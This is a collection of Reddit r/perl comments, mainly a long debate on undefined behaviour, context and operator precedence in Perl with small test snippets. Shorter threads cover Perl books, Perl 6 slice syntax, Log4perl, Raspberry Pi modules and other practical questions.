&gt; Time (and history) is irrelevant in logic. Operator precedence and associativity are logical concepts. They didn't happen by accident in Perl. The worst Perl book I read had a lengthy explanation of counting the number of elements in an array. It eventually settled on `$count = $#elements + 1;`. Then, in a sentence at the end of the section, it said "You can also write `$count = @elements`, but that appears to be a bug that may be fixed in a future version." I kept that sentence in my mind while writing Modern Perl. Context is fundamental to the design of Perl. It didn't happen by accident, and you won't understand the language as a whole until you understand context. The same goes for homoiconicity in Lisp, the stack in Forth, message passing in Smalltalk, and ownership in Rust. Maybe these ideas aren't common sense. They can be difficult to understand, but they're intrinsic to the design of those languages. If simple examples such as `$a = (1, 3)` don't fall out naturally from the fundamental design principles of the language -- if the language designer is hand-waving this behavior as "undefined" -- then the fundamental design principles of the language are incomplete and inconsistent.
&gt; Context is fundamental to the design of Perl. I don't understand where did you pick up the perception that I was against context. I was for context, and even expressed that I was against that spreading certain syntax over its original intended context. And I broadened the concept of context beyond simply scalar, list, void, boolean, ... data types. For example, I expressed that (I believe) the original intention for v-string is to have (perl) version checking more readable, and it spreads to a general way of literal string simply because it does not incur cost to the parser. That is an example of context globalization, and I was against it. &gt; The same goes for homoiconicity in Lisp, ... The very reason I love Perl is because it takes an approach opposite to the approach of Lisp, Forth, etc. Perl takes the initiative to pro-human-semantics rather than cling to the abstract beauty of the mesmerizing succinct mathematical code model. I understand the intentions of the designers of those languages (and even appreciate them a lot), but I also understand those intentions differs fundamentally from the intentions of Perl design -- if not, it should. &gt; then the fundamental design principles of the language are incomplete and inconsistent. Practical languages are incomplete and that is because our semantics are incomplete. And the reason our semantics are incomplete is because our semantics are complex. When we deal with a horse, for example, our semantics do not limit to white horse or black horse, it even allows room for any potential requirement of horse that has certain ear for example. The key here is, our sematics do not put limit around it and call it complete. However, we do put context around it, and we slide in and out of context all the time. Context makes the incompleteness irrelavant. If we simply ignore the context, our semantics are inconsistent. And sometimes when we lose track of contexts we do end up inconsistency but that should be remedied. So design principles obsessed with completeness and (context-free) consistency is a misguided obsession. Historically, programming is pioneered by mathematicians, and mathematicians are notorious for impractical obsessions. Perl is aiming for practical, which I believe is the idiom -- there's more than one way to do it -- intended to mean. PS: `$#elements`, I find myself never used this and am considering not to implement it.
&gt; I don't understand where did you pick up the perception that I was against context.... So design principles obsessed with completeness and (context-free) consistency is a misguided obsession. I think I'm confused, because you're asking a nonsensical question. I don't mean to be rude; I mean that you're asking for something that's logically inconsistent, and you seem to be justifying it by saying that (my paraphrase) the logical coherence of a programming language specification is a false idol. That's wrong. Let's go back to the start. You say that this is surprising and should be undefined: `$a = (1, 3);`. Three features of Perl syntax and semantics govern the interpretation of that code: the associativity of the comma and assignment operators, the precedence of those operators, and any grouping characteristics of the parentheses which may modify either. None of these are accidental decisions. None of these are arbitrary. There is no ambiguity in the optree produced from this expression; it doesn't change from run to run and it doesn't change from version to version. This isn't in the category of `$y = $x++ + ++$x`, which could easily be specified fully or left up to implementations. These are fundamental decisions you make when *parsing* and *evaluating* a language, just like whether your language has pass-by-value or pass-by-reference semantics. No language worth using for anything practical would have arbitrary semantics here. No language specification worth implementing would leave precedence or associativity up to the implementation. That's a recipe for disaster and incompatibility -- and specifying a language at this level is a very *healthy* respect for consistency, not an obsession at all.
&gt; Let's go back to the start. You say that this is surprising and should be undefined: $a = (1, 3);. &gt; &gt; Three features of Perl syntax and semantics govern the interpretation of that code: the associativity of the comma and assignment operators, the precedence of those operators, and any grouping characteristics of the parentheses which may modify either. &gt; First, a question, would you write such code: `$a = (1, 3);`? If you do, then ignore my rest because we will have a different type of discussion. Assume you won't, why? Because that code is nonsensical. What do I mean by "nonsensical"? `$a` makes sense, it's a scalar variable. `(` and `)` makes sense, they are making a list. `1,3` makes sense, they are a list of two numbers. So why together they don't make sense? Because they are out of semantical contexts. We don't know what we are intending putting these three elements together like this. To Perl parser, it does not have semantical contexts, so it blindly applies *context-free* rules of precedence -- but the semantical context for precedence rules are for math expressions. Obviously, the cited code is out of math context and still blindly applying this rules and claim this is what it supposed to do is stubbornly nonsensical. By common sense, extract behaviors/reasoning out of its context and blindly putting it into a very different context, the consequence become *undefined*. For example, hug your love is nice, hug a stranger is undefined, even hug your love at a bad moment is undefined -- that is where undefined mean. By carefully explaining how hug works without discussing its semantic context is nonsensical. &gt; No language worth using for anything practical would have arbitrary semantics here. No language specification worth implementing would leave precedence or associativity up to the implementation. That's a recipe for disaster and incompatibility -- and specifying a language at this level is a very healthy respect for consistency, not an obsession at all. Perl already does (of course not arbitrary). E.g. the built-in functions are grouped into unary type and list type. There are no clear rules (other than the semantic meaning of the functions and in the end, one only can memorize as "Perl said so"). 
PHP is pretty much the only scripting language of the 'language war' that I still wouldn't suggest for anything. Too many fundamental flaws in design that will never be fixed. EDIT: also I think he was making a jab at rust, not PHP
This is more about bad or confusing practices. I would in addition recommend not using v-strings at all if you can help it; they were a weird attempt at representing version tuples in a compact/comparable way, but just use version.pm instead for that. Their "best" use is the most confusing one: specifying byte strings as decimal values. Also note that `use v5.12;` doesn't use v-strings at all, but instead the string 'v5.12' which is then handled by version.pm. Because of that the 'v' is very important, `use 5.12;` would be interpreted as version 5.120, which of course doesn't exist yet.
Makes sense (your comment on v-string). From a standpoint of using an existing software that you have little control of, it is all about practices (so I agree with you here). When implementations are separated out of the language (even at metaphorical level), then you have the discussion of undefined behaviors. Further, as an active user -- vs. passive -- think the way we use our natural language -- then not only you can have an opinion of what is a good way or a bad way to say, you can actually just go out practice and advance the language in a practical way -- that is exactly how our natural language evolves. I do not just love Perl. I think Perl is a primitive of a new-age programming model, where programming language as a mean surpasses the initial discipline of mathematical exercises, where it is an end. (In that regard, Python is a step backward, trying to bring the language back to formality. By any measure, we are at the very early age of computing, so we are allowed to wander about.)
What should it mean?
&gt; First, a question, would you write such code: `$a = (1, 3);` I would, for a didactic purpose like this discussion. &gt; `(` and `)` makes sense, they are making a list. Not in a sense that's significant to Perl. The rvalue comma operator here makes a list. The parens are irrelevant to the listiness of the rvalue expression. They're meaningful to precedence; otherwise the entire expression would be evaluated as equivalent to `($a = 1), 3;`. &gt; We don't know what we are intending putting these three elements together like this. *I* certainly do. &gt; By common sense This is where you're going wrong. You misunderstand how the list works in this expression, and you blame it on Perl not adhering to "common sense", whatever that means. That's not a reason to call behavior undefined, as if it's not documented, tested, and understandable by understanding how Perl works. &gt; There are no clear rules See `perldoc perlop` for the associativity and precedence rules of these two operators. Again, if you're going to implement a language where you can't rely on a table of associativity and precedence, you'll end up with something that's even less "common sense" because it's completely unpredictable.
&gt; you are stressing that "hug" is well-defined action and whether it is appropriate is irrelevant or obviously that I don't understand what hug is. That's right. There's one and only one accurate interpretation of how the assignment and list operators interact in this example, unlike the example of `$y = $x++ + ++$x`, where the associativity and precedence rules are ambiguous in Perl. (They don't *have* to be ambiguous, but they are in Perl in this situation.) Undefined behavior isn't about whether anyone would write code that way. It's about whether the specification for the language -- whatever that is -- describes what should happen unambiguously.
As I understand it (haven't looked at the code in a while), a couple of pieces of the implementation make that code evaluate in a surprising way, related to SVs stored on the stack.
well: $ cat t.pl #!/usr/bin/perl use strict; my $x = 1; my $y = $x ++ + ++ $x; print "x:$x, y: $y\n"; $ perl t.pl x:3, y: 4 Using perl v5.14.2. It appears OK to me. It is a bit non-sensical, but if: ``` $z = $x++ + ++$y; ``` Then it appears even sensical. I wouldn't write such only because I don't like its style (compact several semantic units into one line is bad to read), but I can understand how some folks may like this style. When you say ambiguous, what is the other way of parsing this (other than the evaluation order for the binary operator, which I assume the convention is left then right)?
My mistake; I was thinking of `$y = ++$x + ++$x`.
"Undefined behavior" is a specific terminology (in documentation) that means the behavior is not specified by documentation or tested for, so even if a specific behavior is found, it shouldn't be relied upon.
Next question, what is the reason for undefined behavior? Why not simply describe the found behavior? Behaviors always can be found, so you won't have undefined behavior, won't that be better for the users? And isn't describing behavior what documentation supposed to do?
So what do you call that behavior, a bug?
Once behavior is defined, it can't be changed without breaking backcompat. (People still rely on undefined behavior sometimes, but unless it's widespread, there's no compunction for the developer to maintain that behavior.) It may come up later that the behavior is better changed, which has not yet been determined.
You are describing a software as an end product. Programming language may be viewed as a software. I am viewing it as a language, which is a mean to intention. In situations where intention is nonsensical, the mean is undefined. 
I think it is easy to guess *how* it happens. `$x++` *copies* the *value* of $x to the register or stack and increments the variable. `++$x` increments the variable and simply puts the (alias or pointer) of the variable to the register. It saves a copy so it makes sense in the implementation. It is only safe to use this shortcut when the variable only gets assigned once in an expression, which is not true in this case. That's the theory. So try this: $ cat t.pl use strict; my $x = 1; my $y = ++$x + ($x=9); my $x = 1; my $z = ($x=9) + ++$x; my $a = ($x=1) + ($x=3) my $b = ($x=3) + ($x=1) print "x:$x, y:$y, z:$z, a:$a, b:$b\n"; $ perl t.pl x:10, y:18, z:20, a:6, b:2 There is nothing to do with associativity or precedence. It really depends on the intention. If we decide such construct is non-sensical, we can simply declare such is *undefined behavior* and keep the shortcut. If we decide this is against the intention of mathematical correctness, then it is a bug. The fix seems obvious but probably there is reluctance. One is to always do copy during expression evaluations. Perl will be slower. The other is to run pre-checks to make sure variables only gets assigned once per expression. The check can be complicated consider that in theory that the expression can be very very deep. And it will also be slower. EDIT: On second thought, simply add a flag to the sv variable similar to copy on write should fix this bug without incuring overhead. That is if it is deemed bothersome. I wouldn't bother to fix it at all. I would call it undefined. In fact, to my taste I would call all assignments in an expression undefined except for a few very well-known special cases. General expression with assignment side-effects is very bad to read. Go for example, bans the `++` in an expression, that is very sensible, but it still takes the convention of universal rules. I think like our natural language, some non-conforming idioms are very useful. For example: `$a=$b=$c=0`, and `$ret = $a++`. I think there is nothing wrong and very simple to implement such context-specific idioms without spreading to universal context, simply declare any construct that is outside specific context to be undefined will do. PS: Just read the perldoc, I think it is a wrong comment. It is clear from my example that each sub-expression gets evaluated (including assigned or incremented) from left to right of a binary op. The problem is it should copy rather than reference, so if there is an intention (to claim this sensical), then it has to be a bug. So this leads back to the `my $x = (1,3)` case. I don't see any difference here. In either case, Perl has chosen a behavior out of implementation convenience/short-cut. In the case of `my $x=(1,3)`, the parentheses can be either interpreted as list construct or math parentheses and most common sense would view it as list construct as comma is not a typical math operator but a list separator. Perl chose later not because it interpret such (it is code, so it does not think) but due to convenience -- all parentheses in a scalar context is viewed as mathematical grouping parentheses (despite a useless one). Now for the `$y=++$x + ++$x` case, despite a clear mathematical interpretation, it chose to ignore it and to stick to a shortcut. So either case, Perl behaves counter to common sense (common expectation) out of a resistance to change existing convenience. I don't see any fundamental difference. PS2: On reflection, when people write `my $x=(1,3)`, probably they are having typo from `my ($x)=(1,3)`. This happens a lot. For example: sub get2 { return 1,3; } my $x = get2(); print "x: $x\n"; So if this is the case, the intention is clear, and it is a bug (for Perl to behave as is). To explain, there are many languages that accepts a list assignment to a scalar, so it has certain convention. Convention is a type of common sense. So it is questionable for Perl to behave differently -- unless there is a sensical reason -- there isn't. The reason is Perl didn't bother to treat this case (assigning list to scalar) specifically and its default behavior takes over. PS3: Read a few more documents, and apparently this behavior is straight from C (nothing to do with contexts or list). That is a bad part from C. Comma operator should be banned other than a few idioms, such as `for` construct, C or Perl. C doesn't have list, Perl does. PS4: Here is a simpler example for the assignment behavior: my $x = 1; my $y = $x + ($x=100); print "x:$x, y:$y\n";
Not sure. First time with Perl. 
The #!/usr/bin/perl line (sometimes known informally as the *shebang line*) is, as [/u/spr00t](/u/sproot) pointed out, the filesystem path to the Perl binary on Unix and Unix-like operating systems. Similarly, you'd use, say #!/bin/sh for a shell script or #!/usr/bin/php for a PHP command-line script. The line is entirely meaningless under Windows, though, and can be omitted. EDIT: omitted ! for PHP
How are you launching the script? It's not a perl error.
Did you miss out the `!` for php? 
PerlScript AFAIR is 32-bit only. Try installing 32-bit ActivePerl.
Thank you, thank you, thank you! Worked like a charm. 
What kind of example/relevant projects does nim in action have? Perl has been around so long that it's likely that similar examples exist either in the wild, or as part of a CPAN distribution. Could be worth putting a git repository together of such Perl examples that newcomers would find useful.
There is nothing useful that can come out of a comment with this kind of tone. I can appreciate if you want to have a discussion on this topic, but unqualified hyperbole and straight-up insults cannot be part of it.
Thanks for staying on top of the moderation I'm busy as hell and have been doing a lousy job of helping out, so I appreciate it. **Update**: Yes, I've completely rewritten my response. I said something I shouldn't have and was called on it. I'm a bad boy.
Thanks for the recommendation. That might be one of the few Perl books I don't own. Edit: Bought a used copy!
While we're on the subject of books, I've read a good bit of yours and have really enjoyed it so far. I can't remember if I've told you this on here before, but the taustation updates are very fun to read and I've really liked the minimalist design choices made so far. If you ever wanted to write another book I'd definitely pick it up.
[removed]
Toby Inkster was/is writing a book that sounds promising, but I have no idea if/when it will be available http://blogs.perl.org/users/toby_inkster/2014/12/book-report---december-2014.html I would love to write a book, I have time, might be able to pull it off, but don't have the money to fund myself. Thing is with books on Perl (and most technical books in general) that it's a labor of love.
If we're talking specifically about Perl 6 I'd be more inclined to use [Inline::Perl5](https://github.com/niner/Inline-Perl5) and [Mojo::UserAgent](http://mojolicious.org/perldoc/Mojo/UserAgent) over BeautifulSoup, you'd likely run into slightly less issue with the interface. Something like Matplotlib is a fairly good shout for goto Python, but web scraping is genuinely something Perl 5 is excellent at. There are already several HTML parser libraries for Perl 6 already too [Gumbo](https://github.com/Skarsnik/perl6-gumbo), [HTML::MyHTML](https://github.com/MadcapJake/p6-MyHTML) and [HTML::Parser](https://github.com/tony-o/perl6-html-parser) (which is secretly an XML parser under the hood).
Is matplotlib superior to gnuplot?
Nice. :) Couple ideas to consider, given that this is about bridging between a language that typically uses sigils and one that never does afaik: 1 **Slash the sigils?** Most of your "variables" don't vary in value after initialization. I think (not sure) you *could* have written your code like this: my \t = [ 0, 0.2 ...^ 5 ]; plt.plot: t, t.map(*¹), 'r--', # red dashes t, t.map(*²), 'bs', # blue squares t, t.map(*³), 'g^' # green triangles ; plt.show; Maybe this is an improvement. Maybe not. 2 **Use "fluent" coding?** I think (not sure) you *could* have written your code like this and it might have been an improvement: given ax { .barh: y_pos, performance, :$xerr, :align&lt;center&gt;, :color&lt;green&gt;, :ecolor&lt;black&gt;; .set_yticks: y_pos; .set_yticklabels: people; .invert_yaxis; # labels read top-to-bottom .set_xlabel: 'Performance'; .set_title: 'How fast do you want to go today?'; }
If the idea is good, you should be able to have the publisher help some. I would guess it requires more time than money, although I suppose they are one in the same.
Yes! I find myself wishing Perl6 was going to be The Great Uniter. Does anyone else remember some of the ideas that floated by around 2006? My favorite was that Perl itself, or rather Parrot, would be a "universal" platform, on which theoretically any language could be applied. You know Python, but want to use the Perl Genomics stuff, go ahead! You want to interact with AWS, and would rather use Boto, but you are more comfortable developing in Ruby? Got you covered!
[removed]
Of course! I find this fairly diabolical, but a nice challenge, so here's an example: #!/usr/bin/env perl use strict; use warnings; use Log::Log4perl; Log::Log4perl-&gt;init(\ q{ log4perl.category.Foo = DEBUG, Screen log4perl.appender.Screen = Log::Log4perl::Appender::Screen log4perl.appender.Screen.layout = PatternLayout log4perl.appender.Screen.layout.ConversionPattern = %Z %m%n log4perl.appender.Screen.layout.cspec.Z = sub { my $i = 0; while(caller($i)) { $i++ } return "-" x ($i - 4); } }); my $logger = Log::Log4perl-&gt;get_logger('Foo'); $logger-&gt;debug("calling depth1"); depth1(); $logger-&gt;debug("finishing now!"); sub depth1 { $logger-&gt;debug("I am in depth1 - calling depth2"); depth2(); $logger-&gt;debug("depth2 is over!"); } sub depth2 { $logger-&gt;debug("I am in depth2!"); } Produces: - calling depth1 -- I am in depth1 - calling depth2 --- I am in depth2! -- depth2 is over! - finishing now! Magic parts: * log4perl.appender.Screen.layout.cspec.Z defines a sub that is called when a %Z is used in the conversion pattern * caller($i) walks up the call stack, incrementing $i as we go. * "-" x ($i - 4) prints as many hyphens as $i is greater than 4 Why "4"? At that part of the code we're deep in Log4perl land, and we need to take into account those parts of the call stack and discard them. Actually it should probably be 5, if you don't want to indent at the top level. As mentioned, this is a pretty crufty hack, and I wouldn't trust it to work consistently (for instance, if for some reason Log4perl took another call path at some point, the indenting might be out).
I like the Unicode operators. I developed a mini-language a while back that used some Unicode operators, and found a hidden benefit: you have to make sure your environment is Unicode-compliant for normal development. That means you're not scrambling around trying to debug a weird Unicode issue with a broken environment during crunch time.
Been writing almost exclusively perl at work for the past few years. Using anything else seems like it would be more work, but I know I have a bias at this point. I have heard similar realizations from other developers using Perl.
&gt; No. Undefined behavior is never useful. Depend on what do you mean by useful. Are defined behaviors useful? If we simply define a currently undefined behavior, e.g., let's define when signed integer overflow, the program crash, so now it is a defined behavior, is it useful? &gt; You don't seem to be viewing programs as a means to accomplish an end That is opposite of what I have been saying (but you did say seem). I guess that also depend on what do you mean by *end*. To me, programmer's intention is an end. Also, the very benefit of undefined behavior is so people can take caution and try to avoid it -- which in my dictionary, is quite useful. &gt; "well, I tweaked my compiler to do x in this case" Depend on the context. In a narrow context that you just want to get certain things done and the shortest path is to tweak compiler, then why not? Now if you want to broaden the context so the program's intention is unambiguous among a set of compilers within your expanded context (that include spatial and temporal), then you need take caution on such short cut. Now be aware that certain historic purists like to expand the context to infinity or as large as they can imagine, one that is unnecessary, two that inevitably makes the language complex and difficult to use (or limited to use). &gt; As if programming wasn't hard enough as it is. You can keep saying so. Or you can explore why. Do you find using your natural language hard? Hard is not a merit. &gt; Also, did you know that programs are generally written by more than one person? We use our natural language with other persons as well. In fact, it is the reason that we write programs with other people that put a emphasis on readability. When the code construct does not match common sense, that will be a problem. However, we should understand how do we compare programming language with natural language. In programming language, the ultimate meaning is the machine code that runs a given machine. In natural language, the ultimate meaning is the action (which includes mental action) it results and it is the speaker or listener who compiles the natural language into actions. So in natural language, we have expanded set of compilers each has unlimited undefined behavior. So to work, we work in narrow context by default and that narrow context is what we call common sense. Because we always assume a narrow context, we achieve efficiency by omitting constructing the context. Now compilers are not smart so they can't really have common sense (for now), but we still can and I argue should have a narrower default context. And anything outside the default context is called undefined behavior. To clarify, I am aware that 5 9s of the rest of the world do not view undefined behavior the way I do, and I am also aware of the actual path of C. That is irrelevant. If all I say is what 5 9s of the rest of the world already say, then why I say it? I am not saying it to get agreement, I am saying it to reasoning. 
I've read _everything_ there is about this. I don't even think that's an understatement. :) But my problem isn't how to create Mojo _applications_ non-blocking, like Joel Berger explains in that article series. My problem is that I don't understand how the inner workings of for example Mojo::UserAgent really works. I find the code really hard (and extremely undocumented). If someone could explain to me exactly _how_ Mojo::UserAgent achieves "non-blockingness", I would be extremely grateful.
Thank you for the information. I am trying to make sure my patches to `perl` do exactly what one would expect on the command line, so linguistic correctness will take a back seat.
&gt; But I feel it hurts readability. Agreed. I wasn't really suggesting those for readability, just to make sure it worked with Inline::Python as I would expect it to. It seems like using a `my $performance` variable is going to be the most attractive solution in most cases if one needs to introduce a Scalar container anyway, double especially if the notion of `my $foo` variables has already been introduced or must be soon thereafter, as will be true for almost anything but superficial material involving Perl 6. That said, for completeness, here's the other obvious (to me) slashed sigil `my` variation: my \performance = ( rand xx $people ).map( 10 × * + 3 ); ... $y_pos, $ = performance, Or the last line could be: $y_pos, $(performance),
See [Slices](http://perldoc.perl.org/perldata.html#Slices): @{$result-&gt;{languages}}{@{$lang-&gt;{languages}}} = @{$lang-&gt;{languageNames}}; For Perl ≥ v5.20, you can use [Postfix Reference Slicing](http://perldoc.perl.org/perlref.html#Postfix-Reference-Slicing): $result-&gt;{languages}-&gt;@{@{$lang-&gt;{languages}}} = @{$lang-&gt;{languageNames}}; Completely postfix dereferenced: $result-&gt;{languages}-&gt;@{$lang-&gt;{languages}-&gt;@*} = $lang-&gt;{languageNames}-&gt;@*;
Following the same procedure as in my first Perl 6 tangent in this thread, removing `-&gt;`s and changing `{foo}` to `&lt;foo&gt;` yields the compiler error: Unsupported use of @{$lang&lt;languages&gt;}; in Perl 6 please use @($lang&lt;languages&gt;) Editing the offending line to suit: $result&lt;languages&gt;{@($lang&lt;languages&gt;)} = @($lang&lt;languageNames&gt;); gives the right result. As a final tweak, in Perl 6 the LHS of an `=` operator decides whether the RHS will be in a list or scalar context so the `@(...)` is not needed on the RHS: $result&lt;languages&gt;{@($lang&lt;languages&gt;)} = $lang&lt;languageNames&gt;;
I may be wrong but you can create a hash from two arrays. $hash{@array1}=@array2 Dereference the hash ref into 2 arrays. $result{@$lang-&gt;languages}= @$lang-&gt;languageNames This is using perl slices so it doesn't work in perl6. I guess you would then have to say $result = \%result;
RIP
You’re right for Perl prior v5.20. See my edit above.
Ah - that would explain why I was getting a syntax error - thanks!
Dahut!
I wasn't sure what to answer about the version of Perl I use, because while I have perl v5.24.0, I always use 5.014; The weren't enough characters available to clarify this.
 $result{@$lang-&gt;languages}= @$lang-&gt;languageNames &gt; This is using perl slices so it doesn't work in perl6. Afaict it does if written with the correct Perl 6 syntax: $result{@($lang&lt;languages&gt;)} = $lang&lt;languageNames&gt; The `@(...)` explicitly tells Perl 6 that you want a slice not just a single element. (A non-parenthesized `$result{@$lang&lt;languages&gt;}` fails because `@` has tighter precedence than `&lt;...&gt;`.)
I kind of prefer using `Z=&gt;` to the slice syntax in Perl6.
Thanks, I am not that familiar with 6. I had just read that because of how dereferencing works it eliminated slices.
How would you write the equivalent of `$result{@($lang&lt;languages&gt;)} = $lang&lt;languageNames&gt;` using `Z=&gt;`?
Perl 6 doc contains [many mentions of 'slice'](https://www.google.com/search?q=site%3Adocs.perl6.org+slice%20) eg the ['Slices' section](https://docs.perl6.org/language/subscripts#Slices) of the Subscripts page.
OOT: if a staff of BuiltInPerl reads this... I sent a couple emails around 2-3 months ago about adding an entry but never received any replies.
A bit of a strange survey. You mention Perl 6, but only ask if the person "tried it" and the rest of the questions are all about Perl 5's versions and frameworks... &gt; This is a great opportunity to capture the state of Perl as a language and as a community. I think you've accomplished that.
Neat! Now I just need to figure out how to make this work on Gentoo.
`my %hash = $lang&lt;languages&gt;.list Z=&gt; $lang&lt;languageNames&gt;.list`
Just use docker and it will ;)
Or, I can just expand the Debian archive, emerge mit-krb5 and gcc-5 (I have 5.4.0, but I'm not sure when GLIBC-3.4.24 became a thing), and not have to use yet another bit of technology.
Can't tell if joking, but either way, have fun!
Not joking. I did this. It was fun. I may make an ebuild for it.
Thanks.
Well, yeah. I'm in much the same position. Perl is rarely the 'wrong tool' (where e.g. regex hacking an XML would be)
Good overview. I'd also recommend checking out [Device::Firmata](https://metacpan.org/pod/Device::Firmata) (and [its glue code for Device::WebIO](https://metacpan.org/pod/Device::WebIO::Firmata)), which can control an Arduino's GPIO directly. This is useful for some of the things that the Pi lacks, like extra PWM channels and an ADC. Finally, try [Device::GPS](http://www.wumpus-cave.net/2015/05/17/improving-perls-gps-support/) rather than GPS::NEMA. The older NEMA module [has some issues](http://www.wumpus-cave.net/2015/05/17/improving-perls-gps-support/) regrading documentation, blocking I/O, and licensing. The first two are fixable, but the third is legally difficult. Device::GPS was written to fix it up.
and the low-contrast grey text on white background that makes it hard to read. the design screams "let's change the sane defaults and make them harder to use to be cool!"
I think this is the relevant github project, if you can identify missing modules and update the scripts to include them: https://github.com/jonallen/perldoc.perl.org 
I've been looking for a project to jump in on, but few have truly piqued my interest. Well, now I am obsessed with microcontrollers and Pis, and I love Perl, so this looks great. This guy needs more help! Plus, Python is total crap.
"I think its Perl 5" ... sigh. This is why Perl 6 really should have had a new name.
[Perl v5.26 removes . from @INC, but don’t think you’re safe!](https://www.masteringperl.org/2017/01/perl-v5-26-removes-from-inc-but-dont-think-youre-safe/) by /u/briandfoy TL;DR From the above article: &gt; ... someone else might put a module in the current working directory, and, in the case that it’s not already installed somewhere else in @INC, the application loads that one. 
http://perldoc.perl.org/sigtrap.html
Give it a bit more time. I think we need "Current Perl version" to say 6.x.x on https://www.perl.org/ before people use "Perl" to generally mean "Perl 6".
But there's the problem. That is NOT the current Perl version. The current Perl 5 version is 5.24.1. The current Perl 6 version is, well, it depends on if you mean the spec or the runtimes. For the time being most people think of Perl and mean Perl 5. The fact that you conflate the two is the same problem as I was highlighting in my (admittedly exasperated) posts. Mojolicious is a Perl 5 library. Perl 6 is a different (if related) language. Perl 5 libraries (including, perhaps especially, Mojolicious) are unlikely to be ported to Perl 6 in any recognizable form.
That has nothing to do with what I'm talking about in my comments. Mojolicious is a Perl 5 library. The fact that that is confusing to people is unfortunate and was entirely preventable.
Even worse than Module::Build, this module is [actively discouraged](https://metacpan.org/pod/Module::Install#WARNING) for new distributions.
Yeah as someone who generally likes sites that use JavaScript, this is distracting and pointless.
Sad to hear this. :'-(
A prime example of why I feel Perl 6's naming harms that language as much or more than it does Perl 5.
No technical feedback, but I recommend including "NAME" and "DESCRIPTION" sections in every module's documentation, as discussed [here](https://metacpan.org/pod/perlpodstyle#DESCRIPTION). These two sections are particularly important for being able to find the module on metacpan.
Yes, it is FIX messages parser / serializer. It does not checks the messages sequence, i.e. that "Logon" message should be first, etc. It up-to user defined FIX-session how to interpret the messages. In fact, the "FIX::Session" is the next level of abstraction. With the module it is a bit more easy to create own FIX-simulators. The sample in @eg@ folder we used to simulate incoming quotes for our system.
Do you have a specific need in mind for figuring out the types? SQLite isn't like other databases--it plays it fast and loose with types. Yes, `ref()` is for finding if something is a scalarref, arrayref, etc. Perhaps the most straightforward way is to check if the data contains only numbers, or has some common floating point format: if( $data =~ /\A [\-\d]+ \z/x ) { # It's an integer } elsif( $data =~ /\A [\-\d\.eE]+ \z/x ) { # It's a floating point num } else { # Treat as string (???) } I might be missing a few things on that floating point check.
Thanks, looks very interesting. Do you have one you use for 4.2 messages or are you strictly on 4.4?
TDD is pretty agnostic as far as languages go. You are creating tests before you write the code. And then write code that makes the tests pass. 
HTTP::Proxy on CPAN is probably what you're after.
I commented on the blog post too, but I found 4 new modules to add! https://github.com/jberger/dotfiles/commit/00975f5f7b0872fac6730d61ea5e06dd35dda92a
Indeed I think both languages suffer at this point. It does seem that while the name Perl (5) was a boon before, I can't imagine that it helps the Perl 6 effort now given the stigma Perl (all) has attained since 2000-ish.
For now htttp requests and responses is enough. But eventually I am looking to do packet inspection
This looks interesting but not quite what I need. I need some kind of module where I can put in the raw data coming from an interface so that I can do all sort of data inspection and manipulation(I should have made this more clear in my question).
You misunderstand "explorative". It means when you don't actually know what you need from the code. Happens a lot in research disciplines where you're thrashing through data looking for something, or when you have a client who doesn't know what actual features they want from you.
Clever ... But, it looks like the author is ignoring the [censoring] problem inherent in the data collection method. That is, Google searches *a priori* preclude people and companies that switched from one language to another but did not write a blog post about it. Further, as the emergence of Go and Swift in recent years has shown, the set of programming languages is not a given. The states in the state matrix are not known ahead of time. Imagine doing this experiment in 1997 or 2007 (if similar data existed). Would it have predicted the rise of Go? What we have here are switching probabilities for those who switch and announce their switch in a particular way. Look at the row for Go again ... Oooops, the probabilities for switching away sum up to 100%. Of course, these are probabilities of switching from one language to another **CONDITIONAL** on switching and announcing the switch. The fact that the sum of the probabilities of switching from Go to some other language add up to 100% does not mean that everyone will switch from Go to some other language. It just means the matrix took into account everyone who switched from Go and announced their switch. Or, look at the row for Erlang ... In the steady state, 93% of Erlang users who switch and announce their switch will announce that they chose Python. This really does not say much about whether there will be Erlang in the future or whether 93% of all Erlang users will switch to Python. That is, the author suffers from not knowing what he does not know and not knowing that he does not know what he does not know. This is a common affliction among developers and programmers: Because they are capable of handling the mechanics of certain types of computations, and because they are surrounded by people who cannot imagine accomplishing such feats, they think they don't need to dwell on what the numbers actually mean. **Updated to add:** And, of course, the analysis suffers from the usual pitfalls of collecting Google search hits. For example, the author's data [shows 50,500 hits for "move from c to go"][2], whereas [my search comes up with 46,100 hits][3]. Eight out of the 10 hits on the first page refer to "Rob Pike on the move from C to Go in the toolchain". **Another update:** And, of course, there is [this][4] (which I forgot about while distracted by other flaws ;-): &gt; The transition matrix is full of zeros, so it's not clear that there will be a single stationary distribution: the process may oscillate between two or more distributions. This also means the power iteration may not converge. To have everything nice you need the matrix to be irreducible and aperiodic. That's why in the Page Rank algorithm you randomly teleport with small probability. Look up the [Perron-Frobenius theorem][5] GIGO forever. [censoring]: https://en.wikipedia.org/wiki/Censoring_(statistics) [2]: https://github.com/erikbern/eigenstuff/blob/master/cache.tsv#L816 [3]: https://www.google.com/search?safe=off&amp;q="move+from+c+to+go" [4]: https://www.reddit.com/r/programming/comments/5zonf2/the_eigenvector_of_why_we_moved_from_language_x/df0hx3o/ [5]: https://en.wikipedia.org/wiki/Perron%E2%80%93Frobenius_theorem *Edited to correct grammar.*
The 'experimental' pragma will already disable the warnings so the third line there is unnecessary. Something else is probably re-enabling warnings, commonly this is because you have something like 'use Moo' later in the program; move the 'use experimental' line after this so it can disable warnings correctly. However see what /u/tm604 said as these warnings are there for a reason.
Thank you. You were right -- they need to be used before "use warnings". I should've seen that! I'll take a look at Data::Munge for my future scripts. Thanks both!
Using [Inline](https://p3rl.org/Inline) to generate an initial XS file is one way of getting ready for release, but you can also automate that process by using [Inline::Module](https://p3rl.org/Inline::Module). It even has a way of working with tools like [Dist::Zilla](https://p3rl.org/Dist::Zilla).
I use this: no if $] &gt;= 5.018, warnings =&gt; "experimental::smartmatch"; use feature "switch"; 
C# and C were developed by completely different communities. Perl6 was developed by the perl community. Not a great comparison. More like python2 and python3.
Other than Larry Wall's initial involvement in both, it's actually rather apt. Perl 5 is being continually developed by a completely separate team from Perl 6.
Could you explain how did you get [from here](https://github.com/dbsrgits/dbix-class/commit/cab79c9109) to: &gt; Perl6 was developed by the perl community Let me help you with some data: * [Perl5 committers sorted by activity](https://www.openhub.net/p/perl/contributors?sort=commits) * [Members (not all active) of the mythical toolchain gang](https://github.com/orgs/Perl-Toolchain-Gang/people?page=2) I see only a single non-Larry individual in the above lists who drank the Rakudo Kool-Aid. What am I missing?
Larry isn't enough for you? No one said it was the same individuals. I said Perl6 was developed by the perl community. 
Looks like https://github.com/metacpan/metacpan-web/issues/1819 is fixed, though some minor issue still left.
